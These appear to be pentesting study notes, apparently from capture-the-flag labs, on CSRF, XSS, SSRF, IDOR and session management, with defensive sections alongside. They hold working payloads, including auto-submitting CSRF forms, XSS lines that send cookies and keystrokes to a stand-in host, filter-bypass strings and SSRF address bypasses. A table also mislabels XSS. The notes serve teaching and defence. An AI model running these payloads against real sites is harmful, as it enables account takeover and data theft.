                                                                         Deduce strings via SLEEP()

```

### Core Cross-Engine Reference

| Database Engine | Single-Line Comment Syntax | Time-Delay Functions | Metadata System Directory |
| --- | --- | --- | --- |
| **MySQL / MariaDB** | `-- ` (with space) <br>

<br> `#` | `SLEEP(5)` | `information_schema` |
| **PostgreSQL** | `--` | `pg_sleep(5)` | `information_schema` |
| **Microsoft SQL Server** | `--` | `WAITFOR DELAY '0:0:5'` | `information_schema` or `sys.tables` |
| **SQLite** | `--` | `randomblob(100000000)` | `sqlite_master` |
| **Oracle** | `--` | `dbms_pipe.receive_message` | `all_tables` |

---

This module covers **Cross-Site Request Forgery (CSRF)**, a vulnerability that occurs when a malicious website tricks a user's web browser into performing an unwanted, authenticated action on a trusted application.

Here is a comprehensive, structured reference guide to add to your cybersecurity notes.

---

## 🏗️ The Mechanics of CSRF

CSRF does not rely on stealing a user's credentials or session tokens. Instead, it exploits the implicit trust relationship between a web application and the victim's browser.

### 1. Why CSRF Works: Automatic Cookie Handling

When a user logs into a web application, the server generates an identity state and drops a session cookie into the browser. By default design, **the browser automatically attaches this session cookie to every subsequent HTTP request directed to that specific domain.**

The browser cannot distinguish intent; it does not care if an HTTP request was initiated by clicking an authentic button on the legitimate site or triggered via a hidden script running on an entirely separate, malicious tab. If the request is bound for the target domain, the cookie is attached.

### 2. The 3 Pillars of a Successful CSRF Attack

For an application endpoint to be exploitable via CSRF, three fundamental conditions must align:

1. **Active Authentication Context:** The target victim must possess a live, authenticated session session cookie with the target application.
2. **State-Changing Impact:** The endpoint must execute an absolute mutation of data (e.g., modifying email addresses, transferring financial funds, or resetting privileges). Read-only requests (`GET` data views) are rarely meaningful targets.
3. **Predictable Query Parameters:** The target request payload must contain exclusively predictable parameters. If the query parameters can be completely mapped by an attacker, they can be accurately forged.

---

## 🗺️ Common Attack Delivery Methods

Attackers deliver CSRF payloads by structuring malicious HTML documents or event triggers that simulate legitimate application forms.

### 1. Hidden Auto-Submitting Forms (`POST` Vectors)

Many developers assume switching data actions from `GET` to `POST` neutralizes CSRF risks. This is false. Attackers easily construct hidden forms on external pages and automate submission using JavaScript upon document loading.

```html
<html>
  <body>
    <form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
      <input type="hidden" name="email" value="attacker@evilmail.thm">
    </form>
    
    <script>
      // Instantly fire the form transaction silently behind the scenes
      document.getElementById("attack").submit();
      
      // Optional: Redirect the user back to prevent obvious suspicion
      setTimeout(function() {
          window.location.href = "http://staffhub.thm:8080/settings.php";
      }, 1000);
    </script>
  </body>
</html>

```

### 2. Image and Interaction Triggers (`GET` & Event Vectors)

If sensitive state changes are handled improperly via `GET` requests, execution is trivial—often requiring nothing more than embedding a standard media reference tag `<img src="...">`.

If the application expects a token but derives it using a weak, reversible algorithm (e.g., a static base64 string of a user's role like `YWRtaW4=` $\rightarrow$ `admin`), an attacker can pre-calculate the token and bind it to visual DOM event triggers:

```html
<html>
  <body>
    <h2>StaffHub Internal Notice</h2>
    <p>Move your mouse over the banner below to load the latest updates.</p>
    
    <img src="http://staffhub.thm:8080/one.png" 
         onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='" 
         width="400">
  </body>
</html>

```

---

## 🔎 Pentesting Methodology: Spotting CSRF Vulnerabilities

During an offensive assessment, follow this structured blueprint to evaluate endpoints for missing or weak anti-CSRF controls:

```
[1. Map Data State Changes] ──► Audit account settings, email/password resets, profile adjustments.
              │
[2. Analyze Token Presence] ──► Is there a 'csrf_token' field? If absent, the endpoint is likely vulnerable.
              │
[3. Test Token Robustness]  ──► Attempt decoding (Base64, MD5). Check if tokens are static or re-usable.
              │
[4. Verify Outside Context] ──► Replicate the raw HTTP request layout in an isolated, external local HTML file.
              │
[5. Launch Proof-of-Concept]──► Execute the standalone form while logged into the app. Confirm if data updates.

```

1. **Prioritize State Changes:** Map out the target application and isolate parameters that handle user settings, credential changes, or account parameters.
2. **Deconstruct Token Properties:** If a token field exists (e.g., `csrf_token`), audit its generation framework. Is it truly random, or is it predictable (e.g., tracking timestamps or user IDs)?
3. **Evaluate Cookie Attributes:** Inspect the session configuration flags. If cookies do not specify isolation boundaries, the endpoint relies solely on implicit trust.

---

## 🛡️ Defensive Engineering: Preventing CSRF

Securing applications against request forgery requires explicit validation layers that verify request origin authenticity.

### 1. Anti-CSRF Tokens (The Synchronizer Token Pattern)

The primary protection mechanism involves assigning a unique, unpredictable, and cryptographically secure pseudo-random value to each authenticated session.

* **The Process:** When the application renders a form, it inserts this session token into a hidden field. When the form is submitted, the server evaluates the inbound parameter against the token bound securely within the user's active server-side session.
* **Why it stops attacks:** Since an external malicious webpage cannot read across domains to steal the unique value, any forged request they emit will lack the correct token value and be dropped immediately by the server.

### 2. Utilizing the `SameSite` Cookie Attribute

Modern browsers support the `SameSite` attribute within the `Set-Cookie` HTTP header configuration. This explicitly dictates cookie transmission behaviors during cross-site requests:

| SameSite Policy | Transmission Behavior | Security Posture |
| --- | --- | --- |
| **`SameSite=None`** | Cookies are automatically attached to all third-party, cross-site requests. | **Highly Vulnerable**; requires separate token defenses. |
| **`SameSite=Lax`** | Cookies are omitted on cross-site sub-resource requests (like images/forms) but attached when navigating *to* the site via top-level link clicks. | **Standard Default**; blocks basic automated script execution. |
| **`SameSite=Strict`** | Cookies are entirely withheld from any cross-site request. If you click a link pointing to the site from an external domain, you initially appear unauthenticated. | **Maximum Security**; ideal for highly sensitive administrative panels. |

### 3. Additional Defense-in-Depth Measures

* **Custom Headers:** Modern web application architectures (like Single Page Apps) validate requests by enforcing custom API headers (e.g., `X-Requested-With: XMLHttpRequest`). Browsers restrict external cross-site forms from attaching custom headers without passing explicit Cross-Origin Resource Sharing (CORS) pre-flight pre-conditions.
* **Re-Authentication Prompts:** For critical operations (e.g., updating account passwords or modifying financial routing), always force users to re-enter their existing credentials or complete a secondary verification factor.

  ---

   **Cross-Site Scripting (XSS)**

---

#  Cross-Site Scripting (XSS) Core Methodology

## 1. The Architectural Core

To exploit or defend against XSS, you must understand how the browser processes structures, holds session identities, and distinguishes data from executable instructions.

### 🔹 Document Object Model (DOM)

The DOM is the browser’s live, in-memory, structured blueprint of a web page represented as a tree of elements (tags, text attributes). When client-side JavaScript reads or modifies the DOM, the visible layout updates dynamically in real time.

### 🔹 Browser Cookies & `HttpOnly`

Cookies store lightweight local strings (session IDs, preferences). If a session identifier cookie lacks defenses, injected JavaScript can access it via `document.cookie`.

* **The Shield:** The **`HttpOnly`** flag is a backend-set instruction telling the browser that the cookie must *never* be exposed to client-side scripts, completely neutralizing session-stealing via XSS.

### 🔹 Escaping vs. Filtering

* **Escaping (Output Encoding):** The definitive defense. It maps raw characters into safe literals before rendering (e.g., converting `<` to `&lt;` and `>` to `&gt;`). The browser prints `<script>` as harmless plain text rather than compiling an executable tag block.
* **Filtering (Input Validation):** A perimeter sanity-check evaluating if an input matches strict rules (length, digits, character boundaries). It drops known bad strings but is prone to context-dependent bypasses.

---

## 2. Anatomy of an XSS Payload

An XSS payload is an arbitrary JavaScript snippet injected into an untrusted parameter that tricks the browser into executing code under the site's unique security origin. Payloads consist of two operational dimensions:

1. **Intention:** The payload's ultimate goal (e.g., creating a Proof-of-Concept pop-up, logging keystrokes, or exfiltrating data).
2. **Modification (Context Escaping):** Altering the syntax structure so the payload breaks cleanly out of existing HTML tags, value attributes, or native script barriers.

### Core Intentional Vectors

* **Proof-of-Concept (PoC):** Verifies code execution.
```html
<script>alert('XSS')</script>

```


* **Session Exfiltration:** Base64-encodes (`btoa()`) session identities and beams them outward to an attacker's server.
```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

```


* **DOM Keylogger:** Hooks into keyboard event registers to capture input telemetry silently.
```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>

```



---

## 3. The Four Pillars of XSS Classification

XSS flaws are sorted by how the data payload travels through the application lifecycle before executing in a victim's browser context.

### 1️⃣ Reflected XSS

* **The Flow:** The application takes user-supplied input from an immediate HTTP request parameter (like a URL query string `?q=`) and instantly echoes it back inside the HTTP response body without sanitization.
* **Delivery:** Requires tricking a user into interacting with a crafted link or submitting a malicious form link (`https://site.com/search?q=<script>...`).

### 2️⃣ Stored (Persistent) XSS

* **The Flow:** The application accepts an input, writes it permanently into a persistent backend storage engine (database, message log, file system), and later pulls that raw string out to render it to other users or administrators.
* **Delivery:** Highly critical; zero ongoing user interaction is required once planted. Affects anyone loading the compromised page (e.g., comments, profiles, product reviews).

### 3️⃣ DOM-Based XSS

* **The Flow:** The vulnerability executes entirely inside the client-side browser environment. Client-side JavaScript reads data from a controllable client DOM **Source** (like `location.search` or `location.hash`) and unsafe-writes it directly into a dangerous rendering **Sink** (like `innerHTML` or `document.write`).
* **Delivery:** The payload never needs to touch or process through the server's backend infrastructure.

### 4️⃣ Blind XSS

* **The Flow:** A subterranean variant of Stored XSS. The attacker injects a payload into an input field (like a feedback form or support ticket descriptor), but lacks access to view the output page. Instead, the payload is rendered later inside a completely private application boundary (like an internal admin dashboard or log management portal).
* **Delivery:** Requires an out-of-band network callback (like an external HTTP `fetch` or DNS beacon) to notify the tester when and where the payload triggers.

---

## 4. Context Escaping & Filter Bypass Manual

When an application drops input inside tags rather than an open HTML body, you must adapt your input structure to re-establish an executable scripting context.

### Context 1: Standard Input Value Attributes

* **The Scenario:** Your input is placed inside the value assignment of an input field: `<input type="text" name="username" value="YOUR_INPUT">`
* **The Escape:** Close out the parameter quote and close the entire parent HTML tag structure first:
```html
"><script>alert('THM');</script>

```



### Context 2: Textarea Boundaries

* **The Scenario:** Input falls within raw text container tags: `<textarea>YOUR_INPUT</textarea>`
* **The Escape:** You must explicitly close the open container tag to force the browser back into an HTML parsing mode before opening a new script tag:
```html
</textarea><script>alert('THM');</script>

```



### Context 3: Direct JavaScript Reflection

* **The Scenario:** Input is dropped straight into an existing variable string inside a script element block: `let currentProfile = 'YOUR_INPUT';`
* **The Escape:** Balance out the open string quote, terminate the active variable statement using a semicolon, write your standalone payload, and convert all trailing leftovers into inline comments (`//`):
```javascript
';alert('THM');//

```



### Context 4: Recursive Stripping Filters

* **The Scenario:** The server employs a naive, single-pass blocklist filter that looks for `<script>` strings and deletes them entirely.
* **The Escape:** Nest the blacklisted term recursively inside itself. When the engine slices out the inner core, the surrounding outer fragments collapse together to form a fully operational tag:
```html
<sscriptcript>alert('THM');</sscriptcript>

```



### Context 5: Angle Bracket Elimination (`<` and `>` Blocked)

* **The Scenario:** The server explicitly drops or escapes `<` and `>`, preventing the generation of new HTML tags, but leaves quotes intact.
* **The Escape:** Leverage additional event attributes native to elements like images, inputs, or body tags to prompt code execution via inline event triggers (e.g., `onload`, `onerror`, `onmouseover`):
```html
/images/cat.jpg" onload="alert('THM');

```



---

## 📋 XSS Universal Polyglot Reference

An **XSS Polyglot** is a single, highly dense string engineered to break out of multiple attribute scopes, scripts, styles, textareas, and tag boundaries simultaneously while routing around common keywords and character filters. Pentesters throw these at complex endpoints to test multiple execution contexts at once:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

```
Here is the complete **SSRF Advanced Vectors & Defensive Bypass Manual** note again, formatted and structured so you can copy it straight into your playbook.

---

# 🌐 SSRF Advanced Vectors & Defensive Bypass Manual

## 1. Structural Injection Vectors

SSRF does not always manifest as a clean, obvious URL parameter. Vulnerabilities hide inside varied structural constraints depending on how backend developers incorporate user input into server-initiated queries.

### 🔹 Full URL in a Parameter

The application accepts a complete URI (scheme, host, path, and query). Common in webhook managers, URL preview features, and PDF rendering engines.

* **The Exploitation Nuance:** If the application appends backend parameters to your input, terminate your injection string with an ampersand parameter wrapper (`&x=`) to neutralize trailing application additions as dead query variables.
* **Example:** `?server=server.website.thm/flag?id=9&x=` becomes `https://server.website.thm/flag?id=9&x=/appended/path`.

### 🔹 Hostname / Path Only (Partial URLs)

The application supplies a static prefix (like `https://api.internal/`) and allows user control over only the trailing path or destination hostname.

* **The Exploitation Nuance:** If you control the hostname segment, swap it with an external listener domain to capture outbound telemetry. If you control only the path segment, execute **Directory Traversal** (`/../admin`) to break out of the intended directory context and reach root web endpoints.

### 🔹 Hidden Form Fields

Input vectors can be embedded outside the visible address bar inside static HTML structures.

* **The Exploitation Nuance:** Profile setup portals or file importers may reference default locations via hidden inputs: `<input type="hidden" name="avatar" value="/images/default.png">`. Attackers use browser Developer Tools (`F12`) or intercepting proxies (Burp Suite) to modify these parameters directly before form submission.

---

## 2. Perimeter Defense Bypass Techniques

Developers implement automated input validation boundaries to restrict backend requests. These controls fall into three primary strategies, each possessing distinct structural flaws.

### A. Evading Deny Lists (Blacklists)

Deny lists drop requests explicitly matching prohibited targets (like `127.0.0.1` or `169.254.169.254`). They fail because IP addresses can be expressed in multiple valid mathematical architectures:

| Target IP | Alternative Architecture | Bypass String Example | Why It Works |
| --- | --- | --- | --- |
| **`127.0.0.1`** | Decimal Notation | `2130706433` | System kernels automatically resolve large decimals back to standard IPs. |
| **`127.0.0.1`** | Octal Notation | `017700000001` | Pad numbers with leading zeros to switch context. |
| **`127.0.0.1`** | Shorthand Loopback | `0` or `0.0.0.0` or `127.1` | Abbreviated notations that map directly to the local interface. |
| **`127.0.0.1`** | Wildcard DNS | `127.0.0.1.nip.io` | Passes string-based checks because it is a valid domain name, but resolves to localhost. |
| **`169.254.169.254`** | Attacker-Owned DNS | `metadata.attacker.com` | A custom domain configured with an `A` record pointing straight to the cloud metadata endpoint. |

### B. Evading Allow Lists (Whitelists)

Allow lists block all destinations unless they match a trusted pattern (e.g., verifying if a string begins with `https://trusted.thm`).

* **Subdomain Masking:** Attackers register a domain mimicking the trusted pattern: `https://trusted.thm.attacker.com`. If the engine only evaluates prefix strings without strict domain separation, the check passes.
* **URL Credential Abuse:** Leveraging standard URI syntax (`https://user:pass@host/`). Injecting `https://trusted.thm@attacker.com` forces weak parsing engines to treat `trusted.thm` as username credentials while routing the actual outbound request to `attacker.com`.

### C. Open Redirect Chaining

When an allow list cannot be bypassed natively, look for an **Open Redirect** endpoint on the trusted domain (e.g., `https://trusted.thm/redirect?url=http://target`).

By passing the trusted redirect link into the SSRF parameter, the allow list validates the initial URL as trusted. When the server executes the connection, it hits its own redirect file and forwards itself directly to the restricted target network interface.

---

## 3. Exploit Blueprint: Multi-Stage SSRF Walkthrough

The following step-by-step methodology demonstrates bypassing a path-based deny list by abusing a hidden form vector to extract restricted files.

### Step 1: Map the Target Interface

Inspect an account profile page hosting an avatar update utility. Reviewing the underlying source code reveals the tracking parameters use a radio selection menu mapping back to internal system files:

```html
<input type="radio" name="avatar" value="/images/avatars/default.png">

```

### Step 2: Establish the Validation Behavior

Attempting to change the form value to a target resource like `/private` triggers a strict validation response from the application filter block:

> `Error: Path cannot start with /private`

This signature demonstrates a literal prefix string match condition.

### Step 3: Craft a Normalization Bypass Payload

Because the blocklist inspects the string *before* the web server normalizes the path directory hierarchy, inject an arbitrary directory prefix followed by relative dot-dot-slash traversal operators:

```html
value="x/../private"

```

* **The Validation Phase:** The string starts with `x/`, missing the blacklisted `/private` match rule. The check passes.
* **The Normalization Phase:** The underlying web engine parses the string. It enters folder `x`, encounters `../`, steps up one level to root, and executes a local read on `/private`.

### Step 4: Exfiltrate and De-serialize the Payload

The application reads the local data and returns it rendered securely into the user's view source screen inside a Base64 Data URI string layout:

```html
<img src="data:image/png;base64,UEFSTE9BRF9ERVRBSUxTX0dPX0hFUkU=">

```

Isolate the payload string and pass it straight through your terminal decoding terminal suite to reveal the hidden flag contents:

```bash
echo "UEFSTE9BRF9ERVRBSUxTX0dPX0hFUkU=" | base64 -d

```

---

# 🔑 Insecure Direct Object References (IDOR) Playbook Manual

## 1. The Architectural Threat

An **Insecure Direct Object Reference (IDOR)** occurs when an application exposes a direct reference (such as an integer, string, or key) to an internal backend resource or data object, allowing a user to manipulate that reference to access or modify unauthorized data.

### 🔹 The Root Cause: Missing Authorisation

In an IDOR scenario, the application's **Authentication** layer functions correctly (it validates *who* you are via a live session cookie). However, the **Authorisation** layer is entirely absent or broken.

The server-side application logic fails to perform a critical check: validating whether the authenticated session token possesses ownership or access rights to the specific object identifier requested.

### 🔹 Position & Classification

* **OWASP Top 10 (Web):** Category #1 — **Broken Access Control**.
* **OWASP API Security Top 10:** Categorized as **BOLA (Broken Object Level Authorisation)**.

---

## 2. Taxonomy of Object Identifier Formats

Developers leverage different structural representations for internal keys. Identifying the scheme dictates the enumeration strategy.

```
                  ┌──────────────────────────────┐
                  │  Object Identifier Formats   │
                  └──────────────┬───────────────┘
          ┌──────────────────────┼──────────────────────┐
          ▼                      ▼                      ▼
    [Plaintext]              [Encoded]               [Hashed]
  e.g., id=1305          e.g., id=TVRJeg==       e.g., id=202cb962...

```

### A. Plaintext (Sequential / Numeric)

* **The Scenario:** Identifiers map directly to database primary keys or autoincrement sequences.
`http://online-service.thm/profile?user_id=1305`
* **Exploitation:** Increment or decrement the sequence directly (`user_id=1304`, `user_id=1306`) to extract or modify adjacent target records.

### B. Encoded (Reversible Transformations)

* **The Scenario:** Identifiers are obfuscated into ASCII-safe strings (typically **Base64** text strings containing characters `a-z`, `A-Z`, `0-9`, and `=` padding elements).
`http://online-service.thm/profile?id=TVRJeg==`
* **Exploitation Method:**
1. Strip and decode the string via your terminal suite: `echo 'TVRJeg==' | base64 -d` $\rightarrow$ `123`.
2. Mutate the plaintext integer target value: `123` $\rightarrow$ `1`.
3. Re-encode the modified value string: `echo -n '1' | base64` $\rightarrow$ `MQ==`.
4. Inject the re-encoded string value back into the request target.



### C. Hashed (Cryptographic Signatures)

* **The Scenario:** Identifiers are run through one-way cryptographic algorithms (MD5, SHA-1, SHA-256) to yield a fixed-length hexadecimal hash value.
`MD5(123) = 202cb962ac59075b964b07152d234b70`
* **Exploitation Method:** If the input to the hash is a sequential integer, pre-compute the matching hashes locally.
1. Determine hash architecture via length: **MD5** (32 characters), **SHA-1** (40 characters), **SHA-256** (64 characters).
2. Use precomputed databases (like *CrackStation*) or local looping bash scripts to compute ranges:
```bash
for i in {1..20}; do echo -n $i | md5sum; done

```


3. Replace the application hash parameter with your pre-calculated variant.



### D. Unpredictable Identifiers (UUIDs / GUIDs)

* **The Scenario:** Applications implement random, non-sequential universally unique identifiers (`d3b07384-d9a0-4e9b-8b3c-2f1a6c7e4a90`). Enumeration via guessing is mathematically impossible.
* **The Exploitation Blindspot:** IDOR risks *still exist* if the backend lacks access validation logic. An attacker simply has to harvest valid UUIDs from secondary leaks (such as public forums, HTML source code, API payloads, or shared links).
* **The Two-Account Testing Technique:**
1. Register **Account A** and **Account B**.
2. Authenticate to Account A; isolate and document its random UUID asset strings.
3. Authenticate to Account B; swap its outbound asset tokens with Account A's captured tokens.
4. If Account B views Account A's private data, the endpoint is vulnerable.



---

## 3. High-Probability IDOR Target Zones

IDOR vectors hide inside all application tiers. Restricting your audit scope to the browser URL address bar leaves most vectors undiscovered.

* **Asynchronous Background Requests (AJAX/Fetch APIs):** Inspect the browser's developer tools (`F12` $\rightarrow$ Network tab) or proxy logs (Burp Suite). Look for background JSON service routes pulling details asynchronously (e.g., `/api/v1/customer?id=15`).
* **REST API Path Segments:** Audit standard API path structure patterns where references are embedded explicitly into the URL path: `/api/users/{user_id}/orders/{order_id}`.
* **Hidden Form Elements:** Review raw HTML source strings for concealed functional attributes passed during page submissions: `<input type="hidden" name="account_number" value="98421">`.
* **Parameter Mining (Hidden Properties):** Fuzz endpoints that do not normally show an identifier. If `/user/details` implicitly serves your own account info, try manually appending `?user_id=1` or `?id=1`. If the server honors the parameter and switches the profile view context, you have unmined a latent IDOR vector.

---

## 🛠️ Step-by-Step IDOR Assessment Workflow

Use this workflow to intercept, test, and validate an IDOR flaw safely during an engagement:

```
[1. Intercept Traffic]   ──► Map out the network trail via Burp Suite or F12 Dev Tools.
            │
[2. Isolate Parameters]  ──► Target 'id=', 'user_id=', or path variables inside the payload.
            │
[3. Isolate Session]     ──► Send the targeted HTTP request straight to Burp Repeater.
            │
[4. Mutate & Replay]     ──► Alter the identity reference value (e.g., change id=3 to id=1).
            │
[5. Analyze Content]     ──► Evaluate the response body for unauthorized cross-account text.

```

---

Here is the complete, unified **Session Management Playbook Manual**, fully updated with the **Defenses** section added right onto the end so you can grab the whole thing in one clean copy.

---

# 🍪 Session Management Playbook Manual

## 1. The Architectural Threat

**Session Management** is the engine that maintains state, tracks actions, and enforces authorization decisions across sequential user requests. Because the HTTP protocol is inherently **stateless**, web applications require a persistent mechanism to remember who a user is after they authenticate.

### 🔹 Authentication vs. Authorisation vs. Accountability (IAAA)

Understanding session flaws requires isolating the distinct core components of the Identity assurance model:

* **Identification:** The initial claim of an identity boundary (e.g., submitting a raw username string).
* **Authentication:** The cryptographic or secret verification of that claim (e.g., validating a password match). **This process acts as the direct catalyst for Session Creation.**
* **Authorisation:** The system's ongoing verification that an active session possesses the exact rights required to perform a specific action or access a target dataset. **Session Tracking explicitly handles this constraint.**
* **Accountability:** The chronological logging and auditing of user actions tied to a unique session identifier. This is critical for post-incident timeline reconstruction.

---

## 2. The Session Management Lifecycle

A resilient session implementation must maintain robust security boundaries across four distinct temporal phases.

```text
  ┌──────────────────┐      ┌──────────────────┐      ┌──────────────────┐      ┌──────────────────┐
  │ 1. Creation      │ ───► │ 2. Tracking      │ ───► │ 3. Expiry        │ ───► │ 4. Termination   │
  └──────────────────┘      └──────────────────┘      └──────────────────┘      └──────────────────┘
   • Credential Match        • Inbound Validation      • Max Lifetime Limit      • Explicit Logout
   • Random Generation       • Server Access Lookup    • Inactivity Timeout      • Server Invalidation

```

### 1️⃣ Session Creation

* **Mechanics:** Triggered upon a successful authentication match. The server issues a high-entropy session identifier string to the client.
* **Risks:** Naive token algorithms, guessable custom values, or a failure to rotate the session ID post-authentication (**Session Fixation**).

### 2️⃣ Session Tracking

* **Mechanics:** The client presents the session token inside every consecutive outbound HTTP request. The server parses the value and matches it against an internal database map to resolve user context.
* **Risks:** **Vertical Bypass** (escalating privileges to an admin role) or **Horizontal Bypass** (accessing another user's identical data layer).

### 3️⃣ Session Expiry

* **Mechanics:** The passive defense mechanism. Sessions must enforce an explicit internal lifetime clock. Once exceeded, the session string becomes invalid, forcing a redirect back to authentication.
* **Risks:** Excessive lifetimes that expand the window of opportunity for an attacker holding an intercepted token.

### 4️⃣ Session Termination

* **Mechanics:** The active destruction phase. Triggered immediately when a user hits the "Logout" button or triggers a password reset. The server must explicitly flush and destroy the record inside its backend lookup database.
* **Risks:** Token clearing only on the client side (e.g., deleting a local cookie while the server-side value remains functional).

---

## 3. Storage Mechanisms: Cookies vs. Tokens

Applications fundamentally rely on two storage models to cache session material on client machines.

| Attribute Matrix | Cookie-Based Session Management | Token-Based Session Management |
| --- | --- | --- |
| **Transmission Mechanism** | Automatically appended to every outbound request by the browser engine based on domain rules. | Manually loaded and attached via custom client-side JavaScript headers (e.g., `Authorization: Bearer <JWT>`). |
| **Storage Location** | Browser Cookie Jar | Browser `LocalStorage` / `SessionStorage` |
| **Primary Risk Profile** | Vulnerable to **CSRF (Cross-Site Request Forgery)** attacks if browser context is abused. | Vulnerable to **XSS (Cross-Site Request Forgery)** data extraction via malicious scripts reading local storage. |
| **Architecture Suitability** | Excellent for traditional centralized monolithic web layouts. | Optimized for decentralized, stateless microservices or APIs. |

### 🛠️ Essential Defensive Cookie Attributes

* **`Secure`:** Directs the browser to transmit the cookie exclusively over encrypted **HTTPS** channels.
* **`HTTPOnly`:** Blocks client-side JavaScript APIs (like `document.cookie`) from accessing the data string, neutralizing XSS exfiltration.
* **`SameSite`:** Governs cookie inclusion during cross-origin requests (`Strict`, `Lax`, `None`) to mitigate CSRF vectors.

---

## 4. Assessment Checklist & Lifecycle Testing Vulnerabilities

When auditing session health on a web engagement, step through each lifecycle component to uncover operational flaws:

### ⚠️ Session Creation Flaws

* **Weak Session Tokens:** Check if session strings change based on predictable variables. Decode strings to ensure they aren't basic encoding representations (like `Base64(username)`).
* **Session Fixation:** Intercept an unauthenticated traffic session ID. Log into the application using your test account. If the application keeps the exact same session ID after you authenticate, it is vulnerable. An attacker who seeds a victim with a known token can hijack the account after the victim logs in.
* **Insecure Session Transmission:** Audit single sign-on (SSO) handoffs. Ensure that redirect endpoints post-authentication don't allow open URL modifications that spill token materials into attacker logs.

### ⚠️ Session Tracking Flaws

* **Client-Side State Reliance:** Look for applications that store authorization privileges (e.g., `userRole=student`) in mutable client locations like `LocalStorage`. If you can toggle a number or string value locally and gain access to tabs or API endpoints, the tracking mechanism trusts untrusted user input.

### ⚠️ Session Termination Flaws

* **Ghost Sessions (Missing Backend Revocation):** Capture a valid, active session token string and route it into an interception tool like Burp Suite Repeater. Trigger an explicit logout action inside the main web browser. Return to Burp Suite and replay the request. If the server continues to return authorized profile data with a code `200 OK` rather than a `401 Unauthorized` redirect, the session was never destroyed on the server backend.

---

## 🛡️ 5. Session Management Defensive Blueprint

To effectively insulate an application against session hijacking, fixation, and tracking bypasses, developers must implement structural security controls at every phase of the session lifecycle.

### 🔹 Secure Cryptographic Storage

* **Cookies:** Must be hardened with strict browser-enforced attributes. Always deploy the `Secure` attribute to mandate HTTPS transmission, and the `HTTPOnly` flag to prevent client-side JavaScript access and mitigate XSS exfiltration.
* **Tokens:** When utilizing local storage for tokens (like JWTs), the client application must implement robust contextual handling to prevent malicious scripts from scraping token strings from `LocalStorage`.

### 🔹 High-Entropy Generation & Integrity Protection

* **Randomness:** Custom or native session identifiers must be generated using cryptographically secure pseudo-random number generators (CSPRNGs) to guarantee high entropy and prevent mathematical predictability or brute-force enumeration.
* **Cryptographic Signatures:** For stateless session tokens (such as JWTs), the backend must enforce strong cryptographic signing mechanisms (e.g., HMAC or digital signatures) using robust secret keys. The server must strictly validate this signature on *every* incoming request to ensure data parameters have not been tampered with.

### 🔹 Server-Side Session Tracking & Access Controls

* **Active Validation:** Applications must use incoming session tokens to perform strict server-side lookups. Never trust role parameters or access privileges passed directly from client-side state registers (like LocalStorage).
* **Contextual Authorisation:** The application must actively bind the resolved session identity to the requested resource data. It must explicitly verify if the session owner has permission to read, modify, or delete that specific object array (preventing both Vertical and Horizontal privilege escalation).

### 🔹 Defined Temporal Boundaries (Session Expiry)

* **Max Lifetime Enforcement:** Implement rigid time-to-live (TTL) limits and inactivity timeouts tailored to the application's risk profile.
* **Sliding Windows:** If a session lifetime is dynamically extended during user activity, enforce a hard maximum cap to ensure tokens expire completely after a reasonable timeframe, minimizing the temporal window available to a threat actor holding an intercepted string.

### 🔹 Dual-Action Invalidation (Session Termination)

* **Client and Server Cohesion:** When a logout action is triggered, the application must delete the session identifier from the client's storage *and* issue an explicit invalidation command to destroy the session mapping on the server backend. Otherwise, a user would be unable to destroy their session if it was compromised.
* **Token Blacklisting:** For stateless tokens where immediate server deletion isn't natively possible, the application must track revoked tokens inside an active server-side blocklist or data cache until their natural expiration time elapses, ensuring compromised tokens cannot be replayed.

---



